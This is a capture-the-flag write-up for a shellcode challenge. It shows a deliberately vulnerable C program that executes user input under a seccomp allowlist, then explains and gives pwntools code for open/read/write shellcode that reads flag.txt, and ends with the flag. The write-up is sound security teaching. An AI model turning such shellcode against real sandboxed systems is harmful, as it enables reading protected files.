# $hellc0de-0x2

## Write-up

- Source code :  

```c
#include <stdio.h>
#include <stdlib.h>
#include <seccomp.h>
#include <unistd.h>

#define CODE_SIZE 200

void disable_buffering(void);
void sandbox(void);

char code[CODE_SIZE] = { '\0' };

int main(int argc, char *argv[]) {
  disable_buffering();

  printf("Note: Flag filename is flag.txt\n");
  printf("Enter your shellcode : ");

  read(0, code, CODE_SIZE);

  sandbox();

  (*(void(*)()) code)();

  return EXIT_SUCCESS;
}

void disable_buffering(void) {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);
}

void sandbox(void) {
  scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
  if (ctx == NULL) {
    fprintf(stderr, "seccomp error\n");
    exit(EXIT_FAILURE);
  }

  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
  seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
  if (seccomp_load(ctx) < 0) {
    seccomp_release(ctx);
    exit(EXIT_FAILURE);
  }
  seccomp_release(ctx);
}
```

- A seccomp filter is used and in this case it's a whitelist filter, i.e: only a few syscalls are allowed : `open`, `read`, `write`, `exit` and `exit_group`
- Since flag file is `flag.txt`, we can use the combination of `open`, `read` and `write` to read it, like this :  
  - `open("./flag.txt", 0)` : open flag file, file descriptor is returned in `RAX` register
  - `read(RAX, rwbuf, 0x100)` : read 0x100 bytes from open file descriptor to a controlled read/write buffer address (rwbuf)
  - `write(1, rwbuf, 0x100)` : print 0x100 bytes from rwbuf to stdout
- We can use the `shellcraft` module from `pwntools` to generate the shellcode :  

```python
# R/W address
RWBUF = 0x601800
READSIZE = 0x100
shellcode = asm(
    shellcraft.open("./flag.txt", 0) +
    shellcraft.read("rax", RWBUF, READSIZE) +
    shellcraft.write(1, RWBUF, READSIZE)
)
```

- Full automated exploit with pwntools [here](solve.py)

## Flag

`shellmates{op3N_rE4D_WritE_F0r_Th3_W1N}`
